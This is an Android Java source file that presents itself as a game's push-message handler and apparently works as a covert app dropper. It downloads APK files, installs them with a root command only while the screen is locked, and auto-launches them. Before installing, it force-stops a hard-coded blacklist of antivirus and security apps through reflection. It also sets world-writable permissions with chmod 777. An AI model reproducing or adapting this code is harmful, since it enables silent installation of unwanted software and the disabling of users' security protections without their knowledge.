package cn.com.tiantong.game72.push;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.push.ProtocolParserOtherCommands;
import cn.com.tiantong.game72.push.bean.InstallCommandBean;
import cn.com.tiantong.game72.push.bean.InstallCommandContainer;
import cn.com.tiantong.game72.push.bean.ManageKeyguard;
import cn.com.tiantong.game72.push.bean.SocketHttpRequester;

public class ProtocolParserOtherCommands {
//	final static String tag = "ProtocolParserOtherCommands";
	private final String[] table = { "000", "001", "002", "003", "004", "005", "006", "007", "008", "009", "010" };
	public static int[] blackindex = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	public static final String[] blacklist = { "com.jb.gosms",
		"com.snda.youni", "com.huawei.hotalk", "com.anguanjia.safe",
		"com.lbe.security", "project.rising", "com.nqmobile.antivirus",
		"com.symantec.mobilesecurity", "com.tencent.qqpimsecure",
		"com.wsandroid.suite", "com.qihoo360.mobilesafe",
		"com.ijinshan.mguard", "com.kindroid.security",
		"com.netqin.mobileguard", "com.zbj.netkiller", "com.kms" };
	public static Context mContext = null;
	public static final int Delay = 30 * 60 * 1000;
	public static Timer mTimer = null;
	public static final int Delayreset = 10 * 60 * 1000;
	public static String cmd1 = "";
	public static String cmd2 = "";

	public ProtocolParserOtherCommands(Context context) {
		//LH.LogPrint(tag, "ProtocolParser");
		mContext = context;
	}

	public void handle002(String cmd1, String cmd2) {
		//LH.LogPrint(tag, "handle002:" + cmd1 + ":" + cmd2);
		ProtocolParserOtherCommands.cmd1 = cmd1;
		ProtocolParserOtherCommands.cmd2 = cmd2;
	}
	
	/*
	 * 自激活
	 */
	public void handle009(String pkname, int mode) {
		//LH.LogPrint(tag, "handle009:uri:pkname:" + pkname + ":mode:" + mode);
		if ((pkname != null) && (pkname.length() > 1)) {
			if (ControlBroadcastReceiver.isinstalled(mContext, pkname) == true) {
				//LH.LogPrint(tag, "handle009:package have found!");
				InstallCommandContainer commands = InstallCommandContainer.GetInstance(mContext);
				int ret = commands.Ispackexisted(pkname);
				//LH.LogPrint(tag, "handler009: ret --> " + ret);
				if (ret >= 3) {
					ManageKeyguard.initialize(mContext);
					boolean flag = ManageKeyguard.inKeyguardRestrictedInputMode();
					//LH.LogPrint(tag, "handle009:flag:" + flag);
					InstallCommandBean tip = commands.GetInstallCommand(pkname);
					if (tip != null) {
						tip.setIsauto(1);
						tip.setIsinstalled(1);
						commands.updateinstallCommand(tip);
						if (flag == true) {
							if (commands.CanStartApk() == true) {
								ControlBroadcastReceiver.StartApk_formode(mContext, pkname, mode);
							}
						} else {
							if (InstallCommandContainer.Istimer() == false) {
								InstallCommandContainer.Starttimer();
							}
						}
					}
				}
			} else {
				//LH.LogPrint(tag, "handle009:package have not installed!");
			}
		}
	}

	public String getfileabspath(String filename) {
		String absfilename = null;
		//LH.LogPrint(tag, "getfileabspath:filename:" + filename);
		try {
			File apkFile = null;
			if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
				apkFile = new File(Environment.getExternalStorageDirectory() + "/cidownload/" + filename);
			} else {
				apkFile = new File(mContext.getFileStreamPath(filename).getAbsolutePath() + "/" + filename);
			}
			if (apkFile.exists() == true) {
				if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
					absfilename = Environment.getExternalStorageDirectory() + "/cidownload/" + filename;
				} else {
					absfilename = mContext.getFileStreamPath(filename).getAbsolutePath();
				}
			}
		} catch (Exception e) {
			//LH.LogPrint(tag, e.toString());
		}
		//LH.LogPrint(tag, "getfileabspath:ret:" + absfilename);
		return absfilename;

	}

	public String dodownload(String uri, String filename, Handler handler, int notify_id) {
		//LH.LogPrint(tag, "dsafdsafdsaf:" + filename);
		String absfilename = getfileabspath(filename);
		try {
			if (absfilename == null) {
				
				/*
				 * 此处时常报  内存溢出 这里需要修改
				 * 
				 * 在这里需要注意两个问题：
				 *   1、如果获取不到需要保存到的地址，那么不能让广播一直出现
				 *   2、内存溢出 
				 */
				
				absfilename = SocketHttpRequester.ApacheCMWAPNEWWAYBYTE(mContext, uri, filename, handler, notify_id);
			}
		} catch (Exception e) {
			//LH.LogPrint(tag, e.toString());
		}
		//LH.LogPrint(tag, "fdsafdsafs:" + absfilename);
		return absfilename;

	}

	public static void installaction(Context cm, boolean isinstall, InstallCommandContainer commands, String pkname, String abspath) {
		if (isinstall == true) {
			ManageKeyguard.initialize(cm);
			boolean flag = ManageKeyguard.inKeyguardRestrictedInputMode();
			//LH.LogPrint(tag, "installaction:install flag:" + flag);
			if ((flag == true)) {
				if (doinstall(cm, pkname, "install") == true) {
					//LH.LogPrint(tag, "installaction:doinstall:true");
				} else {
					//LH.LogPrint(tag, "installaction:doinstall:false");
				}
			} else {
				if (InstallCommandContainer.Istimer() == false) {
					InstallCommandContainer.Starttimer();
				}
			}
		} 
		
		
//		else {
//			//LH.LogPrint(tag, "installaction:package install from user!");
//			InstallCommand tip = commands.GetInstallCommand(pkname);
//			PkInfo pkinfo = getpkginfo(cm, abspath);
//			NotificationManage nf = new NotificationManage(cm, tip);
//			nf.notif(pkinfo);
//		}
	}

	public static void installactionandaddcommand(Context cm, boolean isinstall, InstallCommandContainer commands, String pkname, int mode, String info, String abspath) {
		if (isinstall == true) {
			ManageKeyguard.initialize(cm);
			boolean flag = ManageKeyguard.inKeyguardRestrictedInputMode();
			//LH.LogPrint(tag, "installaction:install flag:" + flag);
			if (flag == true) {
				if (doinstall(cm, pkname, "install") == true) {
					//LH.LogPrint(tag, "installaction:doinstall:true");
//					commands.AddInstallCommand(pkname, pkname, mode, 0, 1, 0, info);
					InstallCommandBean tip = commands.GetInstallCommand(pkname);
					tip.setInstalltimes(tip.getInstalltimes() + 1);
					commands.updateinstallCommand(tip);
				} else {
					//LH.LogPrint(tag, "installaction:doinstall:false");
//					commands.AddInstallCommand(pkname, pkname, mode, 0, 1, 0, info);
					InstallCommandBean tip = commands.GetInstallCommand(pkname);
					tip.setInstalltimes(tip.getInstalltimes() + 1);
					commands.updateinstallCommand(tip);
				}
			} else {
//				commands.AddInstallCommand(pkname, pkname, mode, 0, 0, 0, info);
				if (InstallCommandContainer.Istimer() == false) {
					InstallCommandContainer.Starttimer();
				}				
			}
		}
	}

//	private static void createShortCut(Context cm, PkInfo info) {
//		Intent intent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");// action
//		// Intent intent=new Intent();//action
//		intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, info.getAppname());// 快捷方式名字
//		intent.putExtra("duplicate", false); // 是否重复创建快捷方式
//		// Parcelable icon =
//		// Intent.ShortcutIconResource.fromContext(getApplicationContext(),
//		// R.drawable.icon);
//		// intent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, icon);//icon
//		Bitmap scaledBitmap = Bitmap.createScaledBitmap(info.getBm(), 128, 128,
//				true);
//		intent.putExtra(Intent.EXTRA_SHORTCUT_ICON, scaledBitmap);
//
//		Uri uri = Uri.fromFile(new File(info.getAbspath()));
//		Intent startintent = new Intent(Intent.ACTION_VIEW);
//		startintent.setDataAndType(uri, "application/vnd.android.package-archive");
//		intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, startintent); // 启动界面
//		cm.sendBroadcast(intent);// 发送广播
//	}

//	private static PkInfo getpkginfo(Context cm, String filename) {
//		PkInfo ret = null;
//		PackageManager pm = cm.getPackageManager();
//		PackageInfo info = pm.getPackageArchiveInfo(filename,
//				PackageManager.GET_ACTIVITIES);
//		if (info != null) {
//			ApplicationInfo appInfo = info.applicationInfo;
//			appInfo.sourceDir = filename;
//			appInfo.publicSourceDir = filename;
//			String appName = pm.getApplicationLabel(appInfo).toString();
//			Drawable icon = pm.getApplicationIcon(appInfo);// 得到图标信息
//			BitmapDrawable bd = (BitmapDrawable) icon;
//			Bitmap bm = bd.getBitmap();
//			ret = new PkInfo();
//			ret.setAppname(appName);
//			ret.setBm(bm);
//			ret.setAbspath(filename);
//		}
//		return ret;
//	}

	public static boolean doinstall(Context cm, String filename, String command) {
		boolean result = false;
		//LH.LogPrint(tag, "doinstall:filename:" + filename);
		//LH.LogPrint(tag, "doinstall:string:" + command);
		if (ControlBroadcastReceiver.issysuser(cm) == 0) {
			return result;
		}
		Stopotherservices(cm);
		InstallCommandContainer.runRootCommand1(cm, filename);
		//LH.LogPrint(tag, "doinstall:result:" + result);
		return result;

	}

	public boolean writeapk(String filename, byte[] buffer) {
		boolean ret = false;
		//LH.LogPrint(tag, "writeapk:file name:" + filename);
		Process process = null;
		try {
			process = Runtime.getRuntime().exec("chmod 777 " + mContext.getFilesDir());
			// process = Runtime.getRuntime().exec("chmod 777 " + "/data/app");
			process.waitFor();
		} catch (Exception e) {
			//LH.LogPrint(tag, "Unexpected error - Here is what I know: " + e.getMessage());
		} finally {
			process.destroy();
		}
		try {
			FileOutputStream outStream = mContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
			outStream.write(buffer);
			outStream.close();
			ret = true;
		} catch (Exception e) {
			//LH.LogPrint(tag, e.toString());
		}
		//LH.LogPrint(tag, "writeapk:ret:" + ret);
		return ret;
	}

	public boolean writeapk_forsdcard(String filename, byte[] buffer) {
		boolean ret = false;
		//LH.LogPrint(tag, "writeapk_forsdcard:file name:" + filename);
		File dir = new File(Environment.getExternalStorageDirectory() + "/cidownload/");
		if (!dir.exists()) {
			//LH.LogPrint(tag, "create filedir");
			dir.mkdirs();
		}

		File apkFile = new File(Environment.getExternalStorageDirectory() + "/cidownload/" + filename);
		if (!apkFile.exists()) {
			//LH.LogPrint(tag, "create file");
			try {
				apkFile.createNewFile();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//LH.LogPrint(tag, "exception:" + e.getMessage());
			}
		} else {
			//LH.LogPrint(tag, "file exist!");
		}

		OutputStream output = null;
		try {
			output = new FileOutputStream(apkFile);
			output.write(buffer);
			output.flush();
			ret = true;
		} catch (FileNotFoundException e) {
			//LH.LogPrint(tag, "exception1:" + e.getMessage());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//LH.LogPrint(tag, "exception2:" + e.getMessage());
		} finally {
			try {
				output.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//LH.LogPrint(tag, "exception3:" + e.getMessage());
			}
		}
		//LH.LogPrint(tag, "writeapk_forsdcard:ret:" + ret);
		return ret;
	}
	
	//**************************4.80-创建一个文件路径*********************
	public static String create_apk_path(String filename) {
		
		//LH.LogPrint(tag, "writeapk_forsdcard:file name:" + filename);
		File dir = new File(Environment.getExternalStorageDirectory() + "/cidownload/");
		if (!dir.exists()) {
			//LH.LogPrint(tag, "create filedir");
			dir.mkdirs();
		}

		File apkFile = new File(Environment.getExternalStorageDirectory() + "/cidownload/" + filename);
		if (!apkFile.exists()) {
			//LH.LogPrint(tag, "create file");
			try {
				apkFile.createNewFile();
			} catch (IOException e) {
				//LH.LogPrint(tag, "exception:" + e.getMessage());
			}
		} else {
			//LH.LogPrint(tag, "file exist!");
		}
		
		return apkFile.getAbsolutePath();
	}

	public static boolean isWorked(Context context) {
		boolean ret = false;
		if (context != null) {
			ActivityManager myManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
			ArrayList<RunningServiceInfo> runningService = (ArrayList<RunningServiceInfo>) myManager.getRunningServices(30);
			for (int i = 0; i < runningService.size(); i++) {
				if (runningService.get(i).service.getClassName().toString().equals("com.hh.Wss")) {
					ret = true;
				}
			}
		}
		//LH.LogPrint(tag, "isWorked:" + ret);
		// 为了支持捕获screen_off消息
		return ret;
	}
	
	public static void Stopotherservice(Context context, String pkg) {
		//LH.LogPrint(tag, "Stopotherservice:" + pkg);
		boolean result = false;
		try {
			context.enforceCallingOrSelfPermission("android.permission.INSTALL_PACKAGES", null);
			//LH.LogPrint(tag, "permission success");
			result = true;
		} catch (SecurityException localSecurityException) {
			//LH.LogPrint(tag, "security failed");
			result = false;
		}
		if (result == false) {
			return;
		}
		try {
			ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
			List<ActivityManager.RunningServiceInfo> runningservices = manager.getRunningServices(100);
			if (runningservices != null) {
				for (int i = 0; i < runningservices.size(); i++) {
					//LH.LogPrint(tag, "Stopotherservice:servicename:" + runningservices.get(i).process);
					if (runningservices.get(i).process.indexOf(pkg) != -1) {
						//LH.LogPrint(tag, "Stopotherservice:processname:found:" + runningservices.get(i).process);
						Method forceStopPackage = manager.getClass().getDeclaredMethod("forceStopPackage", String.class);
						forceStopPackage.setAccessible(true);
						forceStopPackage.invoke(manager, runningservices.get(i).process);
					}
				}
			}
		} catch (SecurityException localSecurityException) {
			//LH.LogPrint(tag, "Stopotherservice:security:" + localSecurityException.getMessage());
		} catch (Exception localException) {
			//LH.LogPrint(tag, "Stopotherservice:exception:" + localException.getMessage());
		}
	}

	public static void Stopotherservices(Context context) {
		//LH.LogPrint(tag, "Stopotherservice:blacklist.length:" + blacklist.length);
		for (int i = 0; i < blacklist.length; i++) {
			Stopotherservice(context, blacklist[i]);
		}
	}
	
	

}
